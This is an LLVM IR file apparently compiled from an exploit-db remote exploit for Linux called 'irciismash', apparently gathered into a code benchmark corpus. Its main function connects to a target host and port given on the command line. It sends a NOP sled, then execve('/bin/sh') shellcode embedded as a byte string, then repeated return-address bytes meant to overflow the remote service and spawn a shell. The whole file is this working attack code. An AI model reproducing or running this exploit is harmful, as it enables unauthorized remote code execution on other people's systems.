; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19801.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19801.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.nops = private unnamed_addr constant [17 x i8] c"\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\00", align 16
@.str = private unnamed_addr constant [46 x i8] c"\EB\1F^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\08\8DV\0C\CD\801\DB\89\D8@\CD\80\E8\DC\FF\FF\FF/bin/sh\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c" irciismash  ver: 1.0\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"         by         \0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"  bladi & aLmUDeNa\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"Usage : %s hostname port\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [38 x i8] c" ERROR: El puerto esta cerradito :_(\0A\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"[1]- Noping\0A    [\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [3 x i8] c"]\0A\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"     Noped\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"[2]- Injectin shellcode\0A\00", align 1
@.str.11 = private unnamed_addr constant [15 x i8] c"     Injected\0A\00", align 1
@.str.12 = private unnamed_addr constant [16 x i8] c"[3]- Waiting\0A [\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"\FF\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"\BF\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"\E9\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\E3\00", align 1
@.str.17 = private unnamed_addr constant [32 x i8] c"]\0A[4]- Xploit \0A - --(DoNe)-- -\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [17 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [17 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([17 x i8], [17 x i8]* @__const.main.nops, i32 0, i32 0), i64 17, i1 false)
  store i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 -1) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %7, align 8
  %29 = load i32, i32* @AF_INET, align 4
  %30 = load i32, i32* @SOCK_STREAM, align 4
  %31 = call i32 @socket(i32 %29, i32 %30, i32 0)
  store i32 %31, i32* %10, align 4
  %32 = load i32, i32* @AF_INET, align 4
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %32, i32* %33, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atoi(i8* %36)
  %38 = call i32 @htons(i32 %37)
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %38, i32* %39, align 4
  %40 = load i8*, i8** %7, align 8
  %41 = call i32 @h_to_ip(i8* %40)
  %42 = call i32 @inet_addr(i32 %41)
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i32 0, i32 0
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %10, align 4
  %46 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %47 = call i32 @connect(i32 %45, %struct.sockaddr* %46, i32 12)
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %52

49:                                               ; preds = %25
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  %51 = call i32 @exit(i32 0) #4
  unreachable

52:                                               ; preds = %25
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %54

54:                                               ; preds = %72, %52
  %55 = load i32, i32* %12, align 4
  %56 = icmp slt i32 %55, 47
  br i1 %56, label %57, label %75

57:                                               ; preds = %54
  %58 = load i32, i32* %12, align 4
  %59 = srem i32 %58, 7
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %66, label %61

61:                                               ; preds = %57
  %62 = call i32 @usleep(i32 9)
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %64 = load i32, i32* @stdout, align 4
  %65 = call i32 @fflush(i32 %64)
  br label %66

66:                                               ; preds = %61, %57
  %67 = load i32, i32* %10, align 4
  %68 = getelementptr inbounds [17 x i8], [17 x i8]* %8, i64 0, i64 0
  %69 = getelementptr inbounds [17 x i8], [17 x i8]* %8, i64 0, i64 0
  %70 = call i32 @strlen(i8* %69)
  %71 = call i32 @write(i32 %67, i8* %68, i32 %70)
  br label %72

72:                                               ; preds = %66
  %73 = load i32, i32* %12, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %12, align 4
  br label %54

75:                                               ; preds = %54
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0))
  %79 = load i32, i32* %10, align 4
  %80 = load i8*, i8** %9, align 8
  %81 = load i8*, i8** %9, align 8
  %82 = call i32 @strlen(i8* %81)
  %83 = call i32 @write(i32 %79, i8* %80, i32 %82)
  %84 = call i32 @usleep(i32 999)
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0))
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %87

87:                                               ; preds = %107, %75
  %88 = load i32, i32* %12, align 4
  %89 = icmp slt i32 %88, 299
  br i1 %89, label %90, label %110

90:                                               ; preds = %87
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %92 = load i32, i32* @stdout, align 4
  %93 = call i32 @fflush(i32 %92)
  %94 = call i32 @usleep(i32 99)
  %95 = load i32, i32* %10, align 4
  %96 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %97 = call i32 @write(i32 %95, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 %96)
  %98 = load i32, i32* %10, align 4
  %99 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %100 = call i32 @write(i32 %98, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0), i32 %99)
  %101 = load i32, i32* %10, align 4
  %102 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  %103 = call i32 @write(i32 %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 %102)
  %104 = load i32, i32* %10, align 4
  %105 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %106 = call i32 @write(i32 %104, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0), i32 %105)
  br label %107

107:                                              ; preds = %90
  %108 = load i32, i32* %12, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %12, align 4
  br label %87

110:                                              ; preds = %87
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.17, i64 0, i64 0))
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  %114 = load i32, i32* %3, align 4
  ret i32 %114
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @inet_addr(i32) #2

declare dso_local i32 @h_to_ip(i8*) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
